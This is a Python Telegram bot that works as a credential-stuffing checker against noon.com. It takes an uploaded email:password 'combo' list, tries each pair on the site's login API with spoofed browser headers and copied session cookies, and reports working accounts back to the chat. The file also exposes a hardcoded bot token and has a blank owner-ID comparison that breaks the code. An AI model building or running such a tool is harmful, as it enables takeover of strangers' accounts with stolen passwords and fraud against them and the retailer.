from flask import Flask
app = Flask(__name__)

import requests
import telebot,time
from telebot import types
import os
token = '6771947197:AAEzjhrLP3OXbAetwWvOx7uknl4Lu4Qs32w'

bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
	if(message.chat.id == ):
		bot.reply_to(message,"Send Combo File")
		@bot.message_handler(content_types=["document"])
		
		def main(message):
			try:
				dd = 0
				live = 0
				ch = 0
				ko = (bot.reply_to(message, "Checking Your Combo...⌛").message_id)
				ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
				with open("ac.txt", "wb") as w:
					w.write(ee)
				with open("ac.txt", 'r') as file:
					lino = file.readlines()
					total = len(lino)
				for whis in lino:
					try:
						acc=str(whis)
						acc=acc.split('\n')[0]
						email=acc.split(':')[0]
						psw=acc.split(':')[1]
					except:
						continue
					cookies = {
		    'i18next': 'ar-EG',
		    'nguestv2': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiJiZWI2YWExMWUyZDQ0YjgxOGU4ZDIzNTc5YmZjMzA3ZiIsImlhdCI6MTcwNTk0MDIzOSwiZXhwIjoxNzA1OTQwNTM5fQ.jQjePC6nAzxlO7Hu6g_fEaOzJNe4iBtGPC5BDwcT_Is',
		    'ak_bmsc': 'E3401C7BFF350FD99D6A499ECA6401EC~000000000000000000000000000000~YAAQTPASAiTy7BKNAQAAI0X2MRZMhcXuN86ri5R8hvrtfkvpdc/ruHw3E9CzLnYE/RwlQeKmoM/0cKoXAg44pb3ggG7QZCRtuZkyzfnG7HYhtRPnktx0tTbvFIXaL80vmZiun/HK4kepQ2ShbHm9r7h4Z0F/dNUNnd7+ZX1MKOgsBjtsXUQz9BpmOlbdEXcz/PvJVl5UTNMt4vMTD2FU3+qyksewI92b4yGcBmCkmqBdWgk9DJlEMnOdWPpzbJashSFSf23/1cUdqY2giBJVaqY2Sk7NeRTu7AqoTpsvgSp8fQhG7l5/V56caVofUA4YLyJTVP7NjvUkE+qnBbfKzKn1n+D2jndLa96UHjXYiouQMFLhLhsOwZDdqIV5ZFzL0d+C/FFzdiNPI1XG92kv28vTOlhwZyyOgr/okZjIlRDySm2nCrzNU0viYUgIzk19e2s8dDjMjDqpQoFcs8jS/PZxSI+5VO2xh1NbyTqKelREPitwXamzZooESolDfA==',
		    'bm_sv': '77FD328CBBFACE5A0302866F59D7F0B2~YAAQTPASAoby7BKNAQAAeFT2MRa2zi3+K5GsNTDUVq/nDfSWH2iwBb0SrRmGH6MdHKTrVpEDiL8n2Ju5JcmAnZS7anB7cF8XKv6ItCN5IbZ8Vh8s3QJekGUUlTrGLIT1LPlQTZvit5uLVDnX31uB/V+dAwUkdiEp7uJVVMEJqK7kmJvE/5ZDID15EXKIMR/LVghggzRnNi8vAPDocjgjhUhGgwlQtsxBfrMDPidKFehz+jJO0z41Ug7fx74MIA==~1',
		    'RT': '"z=1&dm=noon.com&si=b741a915-653f-4261-ab0a-82b0ff86fdcf&ss=lrp4rsdx&sl=2&tt=xf&rl=1&bcn=%2F%2F684dd313.akstat.io%2F"',
		}
					
					headers = {
		    'authority': 'login.noon.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'en-US,en;q=0.9',
		    'cache-control': 'no-cache',
		    'content-type': 'application/json',
		    'origin': 'https://login.noon.com',
		    'referer': 'https://login.noon.com/egypt-ar/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Windows"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'x-locale': 'ar-eg',
		    'x-platform': 'web',
					}
					
					json_data = {
					    'email': email,
					    'password': psw,
					}
					
					response = requests.post('https://login.noon.com/_svc/customer-v1/auth/signin', cookies=cookies, headers=headers, json=json_data)
					
					try:
						ii=response.json()['error']
						dd += 1
					except:
						ii='Successful Login'
						live += 1
						msg=f"𝐆𝐨𝐨𝐝 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ✅\n𝙴𝙼𝙰𝙸𝙻 : {email}\n𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {psw}\n𝐂𝐨𝐝𝐝𝐞𝐝 𝐁𝐲 : @cb_pa"
						bot.reply_to(message, msg)
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {acc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➾ {ii} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝐆𝐨𝐨𝐝 𝐀𝐜𝐜𝐨𝐮𝐧𝐭𝐬 ✅ ➾ [ {live} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝐁𝐚𝐝 𝐀𝐜𝐜𝐨𝐮𝐧𝐭𝐬 ❌ ➾ [ {dd} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝐓𝐨𝐭𝐚𝐥 ☯ ➾ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝐒𝐭𝐨𝐩 🔮 ]", callback_data='stop')
					mes.add(cm1,status, cm3, cm4, cm5, stop)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''يتم الفحص 
				𝐁𝐘 ➾ @cb_pa ''', reply_markup=mes)
			except:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''حاول بأستخدام ملف اخر''')
	else:
			bot.reply_to(message,"Please Talk To @E2ad0 To Register")
			
			
print("شغال يروحي☝🏿")
bot.polling()
